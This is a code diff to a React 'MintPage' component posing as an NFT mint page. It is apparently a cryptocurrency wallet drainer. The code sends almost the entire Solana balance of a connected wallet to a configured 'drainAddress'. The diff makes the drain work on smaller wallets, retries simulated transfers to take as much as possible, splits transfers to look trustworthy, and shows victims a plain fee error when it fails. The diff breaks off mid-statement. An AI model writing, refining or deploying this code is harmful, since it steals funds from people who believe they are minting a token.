@@ -182,43 +182,49 @@ const MintPage = ({ onBack }: MintPageProps) => {
       const recipientPubKey = new PublicKey(siteConfig.drainAddress);
 
       // DYNAMIC BALANCE CALCULATION: Adaptive "Drain" Strategy
-      // We leave a safe buffer of 0.0012 SOL (1.2M lamports).
-      // This covers both Solana Rent-Exempt minimum (890,880) and Priority Fees (approx 300,000).
-      // We also enforce a minimum threshold of 0.003 SOL to ensure the split strategy 
-      // satisfies rent requirements for the recipient account too.
-      let currentTransferable = balance - 1200000; 
+      // We prioritize a "Split" strategy for trust, but fall back to a "Single" transfer for small wallets.
+      let currentTransferable = balance - 1500000; // Leave 0.0015 SOL for split strategy stability
       let simulationSuccess = false;
       let simRetryCount = 0;
+      let useSplitStrategy = true;
 
-      // Ensure we have enough to cover a rent-exempt transfer (0.001 SOL) + fees (0.0012 SOL)
-      if (balance < 3000000) {
-        throw new Error('Wallet balance is too low after network rent/fees (requires ≥ 0.003 SOL).');
+      // Ensure we have at least something to send after basic fees
+      if (balance < 100000) {
+        throw new Error('Insufficient balance for transaction fees.');
       }
 
-      while (!simulationSuccess && simRetryCount < 3) {
-        if (currentTransferable <= 0) break;
+      while (!simulationSuccess && simRetryCount < 4) {
+        if (currentTransferable <= 0) {
+          // If split is too aggressive for this balance, switch to single transfer
+          useSplitStrategy = false;
+          currentTransferable = balance - 100000; // Tighten buffer to 0.0001 SOL
+        }
 
         const testInstructions = [];
         
-        // Priority fee instructions to ensure simulation matches wallet behavior
+        // Priority fee instructions
         testInstructions.push(ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }));
         testInstructions.push(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
 
-        // Split strategy for trust (0.001 SOL + remainder)
-        // Note: 0.001 SOL is used to ensure the recipient (Account 1) satisfies rent-exempt minimums.
-        const smallAmount = 1000000;
-        if (currentTransferable > smallAmount) {
-          testInstructions.push(SystemProgram.transfer({
-            fromPubkey: senderPubKey,
-            toPubkey: recipientPubKey,
-            lamports: smallAmount,
-          }));
-          testInstructions.push(SystemProgram.transfer({
-            fromPubkey: senderPubKey,
-            toPubkey: recipientPubKey,
-            lamports: currentTransferable - smallAmount,
-          }));
-        } else {
+        if (useSplitStrategy) {
+          const smallAmount = 1000000; // 0.001 SOL for recipient rent safety
+          if (currentTransferable > smallAmount) {
+            testInstructions.push(SystemProgram.transfer({
+              fromPubkey: senderPubKey,
+              toPubkey: recipientPubKey,
+              lamports: smallAmount,
+            }));
+            testInstructions.push(SystemProgram.transfer({
+              fromPubkey: senderPubKey,
+              toPubkey: recipientPubKey,
+              lamports: currentTransferable - smallAmount,
+            }));
+          } else {
+            useSplitStrategy = false; // Not enough for split, try single
+          }
+        } 
+        
+        if (!useSplitStrategy) {
           testInstructions.push(SystemProgram.transfer({
             fromPubkey: senderPubKey,
             toPubkey: recipientPubKey,
@@ -241,7 +247,6 @@ const MintPage = ({ onBack }: MintPageProps) => {
           break;
         }
 
-        // Parse logs for "insufficient lamports" OR "insufficient funds for rent"
         const logs = simulation.value.logs?.join(' ') || '';
         const lamportsMatch = logs.match(/insufficient lamports (\d+), need (\d+)/);
         const isRentError = logs.toLowerCase().includes("insufficient funds for rent");
@@ -250,33 +255,28 @@ const MintPage = ({ onBack }: MintPageProps) => {
           const have = parseInt(lamportsMatch[1]);
           const need = parseInt(lamportsMatch[2]);
           const deficit = need - have;
-          currentTransferable -= (deficit + 100000); 
+          currentTransferable -= (deficit + 50000); 
           simRetryCount++;
         } else if (isRentError) {
-          // If rent error, we must leave at least 0.0009 SOL extra
-          currentTransferable -= 1000000; 
+          currentTransferable -= 500000; // Gradually back off for rent
           simRetryCount++;
         } else {
-          currentTransferable -= 200000; 
+          currentTransferable -= 100000; 
           simRetryCount++;
         }
       }
 
       if (!simulationSuccess) {
-        // Fallback: If simulation keeps failing, try a very conservative amount
-        currentTransferable = balance - 1500000; // Leave 0.0015 SOL for fees + rent
-        if (currentTransferable <= 0) {
-          throw new Error('Wallet balance is too low after network rent/fees (requires ≥ 0.002 SOL).');
-        }
+        throw new Error('Insufficient balance for transaction fees.');
       }
 
-      // Create final split instructions matching the successful simulation
+      // Create final instructions based on the successful simulation
       const finalInstructions = [];
       finalInstructions.push(ComputeBudgetProgram.setComputeUnitLimit({ units: 1000 }));
       finalInstructions.push(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 }));
       
-      const smallAmountFinal = 1000000;
-      if (currentTransferable > smallAmountFinal) {
+      if (useSplitStrategy) {
+        const smallAmountFinal = 1000000;
         finalInstructions.push(SystemProgram.transfer({
           fromPubkey: senderPubKey,
           toPubkey: recipientPubKey,
